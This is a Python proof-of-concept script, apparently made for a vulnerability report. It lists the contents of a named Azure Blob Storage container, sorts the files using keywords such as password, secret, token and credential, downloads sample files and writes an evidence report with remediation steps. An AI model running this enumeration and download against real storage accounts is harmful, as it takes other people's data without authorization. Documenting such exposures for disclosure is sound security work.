#!/usr/bin/env python3
"""
Proof of Concept: Azure Blob Storage Public Directory Listing
Target: premoprodstorage.blob.core.windows.net
Severity: High
"""

import requests
import xml.etree.ElementTree as ET
import json
from datetime import datetime
import hashlib
import os

class AzureBlobStoragePoC:
    def __init__(self):
        self.base_url = "https://premoprodstorage.blob.core.windows.net"
        self.container = "assets"
        self.evidence_dir = "evidence/azure_blob"
        os.makedirs(self.evidence_dir, exist_ok=True)
        
    def fetch_directory_listing(self):
        """Fetch the complete directory listing from Azure Blob Storage"""
        url = f"{self.base_url}/{self.container}/"
        params = {
            'restype': 'container',
            'comp': 'list'
        }
        
        print(f"[*] Fetching directory listing from: {url}")
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            print(f"[+] Success! Received {len(response.content)} bytes")
            
            # Save raw XML
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            xml_file = f"{self.evidence_dir}/directory_listing_{timestamp}.xml"
            with open(xml_file, 'w') as f:
                f.write(response.text)
            print(f"[+] Raw XML saved to: {xml_file}")
            
            return response.text
        else:
            print(f"[-] Failed to fetch directory listing. Status: {response.status_code}")
            return None
    
    def parse_xml_listing(self, xml_content):
        """Parse XML and extract file information"""
        print("[*] Parsing XML directory listing...")
        
        root = ET.fromstring(xml_content)
        namespace = {'ns': 'http://schemas.microsoft.com/azure/blob-service/2009/07/01'}
        
        files = []
        
        for blob in root.findall('.//ns:Blob', namespace):
            file_info = {}
            
            # Extract basic information
            name_elem = blob.find('ns:Name', namespace)
            url_elem = blob.find('ns:Url', namespace)
            
            if name_elem is not None:
                file_info['name'] = name_elem.text
                file_info['url'] = url_elem.text if url_elem is not None else f"{self.base_url}/{self.container}/{name_elem.text}"
            
            # Extract properties
            properties = blob.find('ns:Properties', namespace)
            if properties is not None:
                for prop in properties:
                    tag = prop.tag.split('}')[1]  # Remove namespace
                    file_info[tag] = prop.text
            
            files.append(file_info)
        
        print(f"[+] Found {len(files)} files in the directory listing")
        return files
    
    def analyze_files(self, files):
        """Analyze files for interesting patterns"""
        print("[*] Analyzing files for sensitive information...")
        
        categories = {
            'pdf_documents': [],
            'database_files': [],
            'config_files': [],
            'test_data': [],
            'product_images': [],
            'sensitive_keywords': []
        }
        
        sensitive_keywords = [
            'password', 'secret', 'key', 'token', 'credential',
            'config', 'env', 'database', 'backup', 'dump', 'sql',
            'admin', 'private', 'confidential'
        ]
        
        for file in files:
            name = file.get('name', '').lower()
            url = file.get('url', '')
            
            # Categorize files
            if name.endswith('.pdf'):
                categories['pdf_documents'].append(file)
            elif any(ext in name for ext in ['.sql', '.db', '.dump', '.backup']):
                categories['database_files'].append(file)
            elif any(ext in name for ext in ['.config', '.env', '.ini', '.json', '.yml', '.yaml']):
                categories['config_files'].append(file)
            elif 'test' in name or 'cart' in name.lower():
                categories['test_data'].append(file)
            elif any(kw in name for kw in ['product', 'gift', 'card', 'image', 'photo']):
                categories['product_images'].append(file)
            
            # Check for sensitive keywords
            for keyword in sensitive_keywords:
                if keyword in name:
                    categories['sensitive_keywords'].append(file)
                    break
        
        return categories
    
    def download_sample_files(self, files, sample_size=5):
        """Download a few sample files for evidence"""
        print(f"[*] Downloading {sample_size} sample files for evidence...")
        
        samples_dir = f"{self.evidence_dir}/sample_files"
        os.makedirs(samples_dir, exist_ok=True)
        
        downloaded = []
        for i, file in enumerate(files[:sample_size]):
            try:
                url = file['url']
                name = file['name'].replace('/', '_')
                
                print(f"  Downloading: {name}")
                response = requests.get(url, stream=True)
                
                if response.status_code == 200:
                    file_path = f"{samples_dir}/{name}"
                    with open(file_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            f.write(chunk)
                    
                    # Calculate hash
                    with open(file_path, 'rb') as f:
                        file_hash = hashlib.md5(f.read()).hexdigest()
                    
                    downloaded.append({
                        'name': name,
                        'path': file_path,
                        'size': os.path.getsize(file_path),
                        'md5': file_hash,
                        'url': url
                    })
                    
            except Exception as e:
                print(f"  [-] Failed to download {file.get('name', 'unknown')}: {e}")
        
        return downloaded
    
    def generate_report(self, files, categories, samples):
        """Generate a comprehensive report"""
        print("[*] Generating evidence report...")
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': f"{self.base_url}/{self.container}",
            'total_files': len(files),
            'file_categories': {k: len(v) for k, v in categories.items()},
            'sample_files': samples,
            'vulnerability_details': {
                'title': 'Azure Blob Storage Public Directory Listing',
                'severity': 'High',
                'description': 'Public Azure Blob Storage container with directory listing enabled, exposing 426+ files with metadata.',
                'impact': 'Information disclosure, business intelligence leakage, potential for further attacks.',
                'remediation': [
                    'Disable public read access on the container',
                    'Remove directory listing capability',
                    'Use SAS tokens for required public access',
                    'Store sensitive files in private containers'
                ]
            }
        }
        
        # Save JSON report
        report_file = f"{self.evidence_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate human-readable summary
        summary_file = f"{self.evidence_dir}/summary.txt"
        with open(summary_file, 'w') as f:
            f.write("="*80 + "\n")
            f.write("AZURE BLOB STORAGE PUBLIC DIRECTORY LISTING - POC REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Target URL: {report['target']}\n")
            f.write(f"Timestamp: {report['timestamp']}\n")
            f.write(f"Total Files Exposed: {report['total_files']}\n\n")
            
            f.write("FILE CATEGORIES:\n")
            f.write("-"*40 + "\n")
            for category, count in report['file_categories'].items():
                f.write(f"{category.replace('_', ' ').title()}: {count} files\n")
            
            f.write("\nSAMPLE FILES DOWNLOADED:\n")
            f.write("-"*40 + "\n")
            for sample in samples:
                f.write(f"• {sample['name']} ({sample['size']} bytes)\n")
                f.write(f"  MD5: {sample['md5']}\n")
                f.write(f"  URL: {sample['url']}\n\n")
            
            f.write("\nVULNERABILITY DETAILS:\n")
            f.write("-"*40 + "\n")
            f.write(f"Title: {report['vulnerability_details']['title']}\n")
            f.write(f"Severity: {report['vulnerability_details']['severity']}\n")
            f.write(f"Description: {report['vulnerability_details']['description']}\n")
            
            f.write("\nImpact:\n")
            for impact in report['vulnerability_details']['impact'].split(', '):
                f.write(f"  • {impact}\n")
            
            f.write("\nSuggested Remediation:\n")
            for step in report['vulnerability_details']['remediation']:
                f.write(f"  • {step}\n")
            
            f.write("\n" + "="*80 + "\n")
            f.write("EVIDENCE FILES:\n")
            f.write("="*80 + "\n")
            f.write("1. Full directory listing XML\n")
            f.write("2. JSON report (this file)\n")
            f.write("3. Sample downloaded files\n")
            f.write("4. This summary document\n")
        
        print(f"[+] Report saved to: {report_file}")
        print(f"[+] Summary saved to: {summary_file}")
        
        return report_file, summary_file
    
    def run(self):
        """Main execution method"""
        print("="*80)
        print("AZURE BLOB STORAGE PUBLIC DIRECTORY LISTING - PROOF OF CONCEPT")
        print("="*80)
        
        # Step 1: Fetch directory listing
        xml_content = self.fetch_directory_listing()
        if not xml_content:
            return
        
        # Step 2: Parse XML
        files = self.parse_xml_listing(xml_content)
        
        # Step 3: Analyze files
        categories = self.analyze_files(files)
        
        # Step 4: Download samples
        samples = self.download_sample_files(files)
        
        # Step 5: Generate report
        report_file, summary_file = self.generate_report(files, categories, samples)
        
        # Display summary
        print("\n" + "="*80)
        print("POC COMPLETED SUCCESSFULLY!")
        print("="*80)
        print(f"Total Files Exposed: {len(files)}")
        print(f"PDF Documents: {len(categories['pdf_documents'])}")
        print(f"Sample Files Downloaded: {len(samples)}")
        print(f"\nEvidence saved to: {self.evidence_dir}/")
        print(f"Report: {report_file}")
        print(f"Summary: {summary_file}")

if __name__ == "__main__":
    poc = AzureBlobStoragePoC()
    poc.run()
